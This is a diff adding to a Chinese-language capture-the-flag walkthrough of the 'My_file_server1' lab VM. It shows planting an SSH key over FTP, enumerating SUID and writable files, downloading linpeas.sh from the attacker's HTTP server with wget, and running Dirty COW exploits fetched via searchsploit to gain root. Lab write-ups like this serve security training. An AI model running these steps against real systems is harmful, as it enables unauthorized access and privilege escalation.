@@ -129,5 +129,106 @@ cat sshd_config
 - 翻译一下， Authentication:身份验证，Authorized:授权的
 
 - PermitRootLogin yes:允许root通过ssh登录
-- AuthorizedKeysFile      .ssh/authorized_keys：被授权的密钥文件
-- PasswordAuthentication no:不允许密码登录，那就只能尝试使用
+- AuthorizedKeysFile     .ssh/authorized_keys：被授权的密钥文件（这个也是靶机中的文件位置）
+- PasswordAuthentication no:不允许密码登录，那就只能尝试使用私钥登录（前提是靶机里有对应的公钥）
+
+我们不能直接拿到root密码，所以我们要尝试把自己的公钥传入把靶机中
+
+```
+ssh-keygen -t rsa
+```
+
+![image-20260622223910629](My_file_server1.assets/image-20260622223910629.png)
+
+一直回车就是默认创造一个/root/.ssh/id_rsa文件（包括id_rsa.pub）
+
+从能上传文件的地方入手，优先考虑21端口ftp，因为ftp的版本是ProFTPd1.3.5，搜索发现存在漏洞，是一个远程执行命令
+
+![image-20260622224915897](My_file_server1.assets/image-20260622224915897.png)
+
+```
+ftp 192.168.174.148
+```
+
+登录smbuser用户
+
+尝试
+
+```
+mkdir .ssh
+```
+
+创建成功
+
+```
+put /root/.ssh/id_rsa.pub /home/smbuser/.ssh/authorized_keys
+```
+
+此时smbuser用户下有一个~/.ssh/authorized_keys文件，里面是我们上传的公钥，这时我们再使用私钥登录(在我们的.ssh目录下进行ssh登录)
+
+```
+ssh -i id_rsa smbuser@192.168.174.148
+```
+
+![image-20260622231148711](My_file_server1.assets/image-20260622231148711.png)
+
+没有密码我们也成功登录
+
+把smbuser用户下的文件看遍也没有任何有用信息
+
+- 先查看内核版本和系统信息
+
+![image-20260622231728159](My_file_server1.assets/image-20260622231728159.png)
+
+稍后我们可以再了解一下内核信息，这个内核版本较低
+
+- ```
+  find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
+  find / -perm -u=s -type f 2>/dev/null
+  cat /etc/crontab
+  /usr/sbin/getcap -r 2>/dev/null
+  ```
+  
+  都没有可利用的信息
+
+- 由于我自身经验不足，从内核我自己看不出漏洞，这里用了一个全自动工具linpeas.sh
+
+![image-20260623125614466](My_file_server1.assets/image-20260623125614466.png)
+
+![image-20260623125632120](My_file_server1.assets/image-20260623125632120.png)
+
+```
+cd /usr/share/peass/linpeas
+python3 -m http.server 8080
+```
+
+打开本机服务
+
+```
+cd /tmp
+wget http://192.168.174.128:8080/linpeas.sh
+```
+
+下载后在靶机的tmp目录中直接运行
+
+![image-20260623130025891](My_file_server1.assets/image-20260623130025891.png)
+
+脚本给我们列出的可能有效的漏洞，经过尝试后第二个是有用的
+
+```
+searchsploit -m 40611 40839 40847
+```
+
+![image-20260623130618877](My_file_server1.assets/image-20260623130618877.png)
+
+根据注释操作
+
+- 这里注意一下，靶机的内核漏洞利用完系统环境可能会变化，后续复现的时候要恢复镜像
+
+```
+./dcow -s
+```
+
+运行后生成root密码
+
+成功提权
